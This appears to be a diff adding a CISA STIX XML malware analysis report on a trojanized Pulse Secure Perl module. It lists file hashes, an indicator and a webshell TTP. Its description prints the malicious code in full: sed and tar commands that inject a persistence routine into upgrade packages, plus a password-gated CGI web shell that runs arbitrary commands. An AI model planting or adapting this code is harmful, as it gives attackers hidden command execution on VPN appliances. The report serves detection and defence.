@@ -1,0 +1,322 @@
+<stix:STIX_Package 
+	xmlns:cyboxCommon="http://cybox.mitre.org/common-2"
+	xmlns:cybox="http://cybox.mitre.org/cybox-2"
+	xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2"
+	xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2"
+	xmlns:marking="http://data-marking.mitre.org/Marking-1"
+	xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1"
+	xmlns:TOUMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1"
+	xmlns:incident="http://stix.mitre.org/Incident-1"
+	xmlns:indicator="http://stix.mitre.org/Indicator-2"
+	xmlns:ttp="http://stix.mitre.org/TTP-1"
+	xmlns:stixCommon="http://stix.mitre.org/common-1"
+	xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1"
+	xmlns:stix="http://stix.mitre.org/stix-1"
+	xmlns:NCCIC="http://www.cisa.gov/"
+	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+	xsi:schemaLocation="
+	http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd
+	http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd
+	http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd
+	http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd
+	http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1 http://stix.mitre.org/XMLSchema/extensions/marking/terms_of_use/1.0.1/terms_of_use_marking.xsd
+	http://stix.mitre.org/Incident-1 http://stix.mitre.org/XMLSchema/incident/1.1.1/incident.xsd
+	http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd
+	http://stix.mitre.org/TTP-1 http://stix.mitre.org/XMLSchema/ttp/1.1.1/ttp.xsd
+	http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd
+	http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd
+	http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd" id="NCCIC:Package-36c22777-fbe5-4b9e-a9fe-deea5555199b" version="1.1.1" timestamp="2021-07-14T10:06:35-04:00">
+    <stix:STIX_Header>
+        <stix:Title>MAR-10336935.r1.v1: Pulse Secure</stix:Title>
+        <stix:Package_Intent>Malware Characterization</stix:Package_Intent>
+        <stix:Handling>
+            <marking:Marking>
+                <marking:Controlled_Structure>//node() | //@*</marking:Controlled_Structure>
+                <marking:Marking_Structure xsi:type='tlpMarking:TLPMarkingStructureType' color="WHITE"/>
+                <marking:Marking_Structure xsi:type='TOUMarking:TermsOfUseMarkingStructureType'>
+                    <TOUMarking:Terms_Of_Use>This document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.cisa.gov/tlp.</TOUMarking:Terms_Of_Use>
+                </marking:Marking_Structure>
+            </marking:Marking>
+        </stix:Handling>
+        <stix:Information_Source>
+            <stixCommon:Identity>
+                <stixCommon:Name>cisa</stixCommon:Name>
+            </stixCommon:Identity>
+            <stixCommon:Time>
+                <cyboxCommon:Produced_Time>2021-07-14T10:06:35-04:00</cyboxCommon:Produced_Time>
+            </stixCommon:Time>
+            <stixCommon:Tools>
+                <cyboxCommon:Tool>
+                    <cyboxCommon:Name>BMachine</cyboxCommon:Name>
+                    <cyboxCommon:Description>97</cyboxCommon:Description>
+                    <cyboxCommon:Version>7.1.0</cyboxCommon:Version>
+                </cyboxCommon:Tool>
+            </stixCommon:Tools>
+        </stix:Information_Source>
+    </stix:STIX_Header>
+    <stix:Observables cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+        <cybox:Observable id="NCCIC:Observable-eefc9b3a-25f9-485d-be57-c06c1fb888b4">
+            <cybox:Description><![CDATA[This file is a legitimate Pulse Secure PERL application with malicious CGI code patched in. The malicious CGI code is designed to modify several Pulse Secure system files utilizing the SED command. 
+
+--Begin Patched In Commented CGI Code--
+ ##start_total
+  ##perlstart  
+  system("/bin/mount -o remount,rw /dev/root /");
+  system("/bin/tar -xzf /tmp/new-pack.tgz ./installer/outer-do-install");
+  my $statushh = $? % 255;
+  if( $statushh != 0 )
+  {
+  		system("/bin/tar -xzf /tmp/new-pack.tgz ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi");
+  		system("/bin/tar -xzf /tmp/new-pack.tgz ./root/home/perl/DSUpgrade.pm");	
+  		system("/bin/sed -i '/\#\#start_total/,/\#\#end_total/w K872Bu' /home/perl/DSUpgrade.pm");
+  		system("/bin/sed -i '/DSINSTALL_CLEAN/r K872Bu' ./root/home/perl/DSUpgrade.pm");
+  		system("/bin/sed -i '/\#\#cgistart1/,/\#\#cgiend1/w Mj1Za' /home/perl/DSUpgrade.pm");
+  		system("/bin/sed -i '/\#\#cgistart2/,/\#\#cgiend2/w 1uMfVB' /home/perl/DSUpgrade.pm");
+  		system("/bin/sed -i '/^use DSUtilTable/r Mj1Za' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi");
+  		system("/bin/sed -i '/^sub main/r 1uMfVB' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi");
+  		system("/bin/sed -i '/\#\#cgistart1/,/\#\#cgiend1/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi");
+  		system("/bin/sed -i '/\#\#cgistart2/,/\#\#cgiend2/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi");
+  		system("/usr/bin/gzip -d /tmp/new-pack.tgz");
+  		system("/bin/tar -f  /tmp/new-pack.tar -u ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi");
+  		system("/bin/tar -f /tmp/new-pack.tar -u ./root/home/perl/DSUpgrade.pm");
+  		system("/bin/rm -f K872Bu");
+  		system("/bin/rm -f Mj1Za");
+  		system("/bin/rm -f 1uMfVB");	
+  		system("/bin/rm -fr root");
+  		system("rm -f /tmp/new-pack.tgz");
+  		system("/usr/bin/gzip -c /tmp/new-pack.tar > /tmp/new-pack.tgz");  		  		  			 		  	
+  }
+  else{
+  system("/bin/sed -i '/\#\#start_total/,/\#\#end_total/w Nc3Gy.pm' /home/perl/DSUpgrade.pm");
+  system("/bin/sed -i '/packdecrypt/r Nc3Gy.pm' ./installer/outer-do-install"); 
+  system("/bin/sed -i '/\#\#perlstart/,/\#\#perlend/s/^/#/' ./installer/outer-do-install");
+  system("/bin/sed -i '/\#\#scriptstart/,/\#\#scriptend/s/#//' ./installer/outer-do-install");
+  system("/usr/bin/gzip -d /tmp/new-pack.tgz");
+  system("/bin/tar -f /tmp/new-pack.tar -u ./installer/outer-do-install");
+  system("rm -f Nc3Gy.pm");
+  system("rm -f /tmp/new-pack.tgz");
+  system("/usr/bin/gzip -c /tmp/new-pack.tar > /tmp/new-pack.tgz");
+  system("rm -fr installer");
+  }
+  
+  ##perlend 
+  
+###scriptstart
+#/bin/mount -o remount,rw /dev/root / 
+#/bin/tar -xzf $innerarchive ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi
+#/bin/tar -xzf $innerarchive ./root/home/perl/DSUpgrade.pm
+#/bin/sed -i '/\#\#start_total/,/\#\#end_total/w 7CxA1p' outer-do-install 
+#/bin/sed -i '/DSINSTALL_CLEAN/r 7CxA1p' ./root/home/perl/DSUpgrade.pm
+#/bin/sed -i '/\#\#cgistart1/,/\#\#cgiend1/w GqTv3w' outer-do-install
+#/bin/sed -i '/\#\#cgistart2/,/\#\#cgiend2/w Vi6d8h4' outer-do-install
+#/bin/sed -i '/^use DSUtilTable/r GqTv3w' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi
+#/bin/sed -i '/^sub main/r Vi6d8h4' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi
+#/bin/sed -i '/\#\#cgistart1/,/\#\#cgiend1/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi
+#/bin/sed -i '/\#\#cgistart2/,/\#\#cgiend2/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi
+#/bin/sed -i '/\#\#perlstart/,/\#\#perlend/s/#//' ./root/home/perl/DSUpgrade.pm
+#/bin/sed -i '/\#\#scriptstart/,/\#\#scriptend/s/^/#/' ./root/home/perl/DSUpgrade.pm
+#/usr/bin/gzip -d $innerarchive
+#/bin/tar -f  /tmp/inside-package.tar -u ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi 
+#/bin/tar -f /tmp/inside-package.tar -u ./root/home/perl/DSUpgrade.pm
+#/bin/rm -f 7CxA1p
+#/bin/rm -f GqTv3w
+#/bin/rm -f Vi6d8h4
+#/bin/rm -fr root 
+#/usr/bin/gzip -c /tmp/inside-package.tar > $innerarchive 
+###scriptend
+
+###cgistart1
+#use lib ($ENV{'DSINSTALL'} =~ /(\S*)/)[0] . "/perl/lib";
+#use lib ($ENV{'DSINSTALL'} =~ /(\S*)/)[0] . "/perl/lib/MIME/Base64";
+#use Crypt::RC4;
+#use MIME::Base64 ();
+#
+#sub parse_parameters ($) {
+#  my %ret;
+#
+#  my $input = shift;
+#
+#  foreach my $pair (split('&', $input)) {
+#    my ($var, $value) = split('=', $pair, 2);
+#    
+#    if($var) {
+#      $value =~ s/\+/ /g ;
+#      $value =~ s/%(..)/pack('c',hex($1))/eg;
+#
+#      $ret{$var} = $value;
+#    }
+#  }
+#
+#  return %ret;
+#}
+###cgiend1
+
+###cgistart2
+#    my $enckey='1234567';
+#    my $data='1234567812345678';
+#		my $cipher = RC4($enckey, $data);	
+#		my $encode = MIME::Base64::encode($cipher);
+#    my $psalLaunch = CGI::param("CPrimerPlus");
+#    if ($psalLaunch =~ /<REDACTED>/) 
+#    {
+#    my ($cmd, %FORM);
+#
+#    $|=1;
+#
+#    print "Content-Type: text/html\r\n";
+#    print "\r\n";
+#    %FORM = parse_parameters($ENV{'QUERY_STRING'});
+#
+#    if(defined $FORM{'cmd'}) {
+#     $cmd = $FORM{'cmd'};
+#    }
+#
+#print '<HTML>
+#<body>
+#<form action="" method="GET">
+#<input type="text" name="cmd" size=45 value="' . $cmd . '">
+#<input type="text" name="CPrimerPlus" size=45 value="<REDACTED>">
+#<input type="submit" value="Run">
+#</form>
+#<pre>';
+#
+#if(defined $FORM{'cmd'}) {
+#  print "Results of '$cmd' execution:\n\n";
+#  print "-"x80;
+#  print "\n";
+#
+#  print $encode; 
+#  system $cmd;
+#  print "-"x80;
+#  print "\n";
+#}
+#  print "</pre>";
+#  exit(0);
+#    }
+###cgiend2
+--End Patched In Commented CGI Code--]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-4a773b7a-23d6-4fd6-8cb6-bea1156473fa">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>DSUpgrade.pm</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>9783</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Perl5 module source, ASCII text</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>5009b307214abc4ba5e24fa99133b934</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>afc52937829c78cb14ec087e66e39be3571e00ca</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>64c87520565165ac95b74d6450b3ab8379544933dd3e2f2c4dc9b03a3ec570a7</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>97646de4d68a303fba971c6c83f6077125d4e6e2c02bbeee22881855265c8307fd66c391489aaafdf640e1316e1b63978c66ecadfb04f37bc6755a9e607b129d</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>192:eIB1XcTfXss+nBqXb+TSWbgXCiwWjoBTWFI4MhiirXHLwQBN0G2BiF3Ar8yXpayc:eIB1X1phiJ/irZN0G2BiF3CjCswmPyVv</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>5.228827</FileObj:Peak_Entropy>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+    </stix:Observables>
+    <stix:Indicators>
+        <stix:Indicator id="NCCIC:indicator-167826b5-a361-43db-96e4-cd76d6f459cc" timestamp="2021-07-14T14:06:44.944990+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>MD5 and SHA1 of Malicious File</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-22cfa2bc-086d-4cb1-93b9-d7353c59527b">
+                <cybox:Object id="NCCIC:File-98c23f75-b90f-42eb-9cb9-18c2ba057899">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">5009b307214abc4ba5e24fa99133b934</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">afc52937829c78cb14ec087e66e39be3571e00ca</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">64c87520565165ac95b74d6450b3ab8379544933dd3e2f2c4dc9b03a3ec570a7</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-efd96269-537a-4baf-8373-34a0d4972a37" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2021-07-14T14:06:44+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+    </stix:Indicators>
+    <stix:TTPs>
+        <stix:TTP id="NCCIC:ttp-efd96269-537a-4baf-8373-34a0d4972a37" timestamp="2021-07-14T14:06:44.946366+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>webshell</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-eefc9b3a-25f9-485d-be57-c06c1fb888b4">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+    </stix:TTPs>
+    <stix:Incidents>
+        <stix:Incident id="NCCIC:incident-4f41281e-7b39-4a6b-945b-85ea68faf535" timestamp="2021-06-29T13:38:04-04:00" xsi:type='incident:IncidentType'>
+            <incident:Title>10336935.r1.v1</incident:Title>
+            <incident:Description><![CDATA[##### Incident Summary #####
+
+None
+
+##### Report Summary #####
+
+CISA received one file for analysis. The file is a Pulse Secure system application which has been modified by a malicious cyber actor. The file contains a Common Gateway Interface (CGI) code designed to modify several Pulse Secure system files utilizing the SED command. This analysis is derived from malicious files found on Pulse Connect Secure devices.
+
+##### Conclusion #####
+
+None
+
+##### Mitigation #####
+
+None]]></incident:Description>
+            <incident:Categories>
+                <incident:Category xsi:type="stixVocabs:IncidentCategoryVocab-1.0">Malicious Code</incident:Category>
+            </incident:Categories>
+            <incident:Related_Indicators>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-167826b5-a361-43db-96e4-cd76d6f459cc" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+            </incident:Related_Indicators>
+            <incident:Related_Observables>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-eefc9b3a-25f9-485d-be57-c06c1fb888b4">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+            </incident:Related_Observables>
+            <incident:Leveraged_TTPs>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-efd96269-537a-4baf-8373-34a0d4972a37" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+            </incident:Leveraged_TTPs>
+        </stix:Incident>
+    </stix:Incidents>
+</stix:STIX_Package>
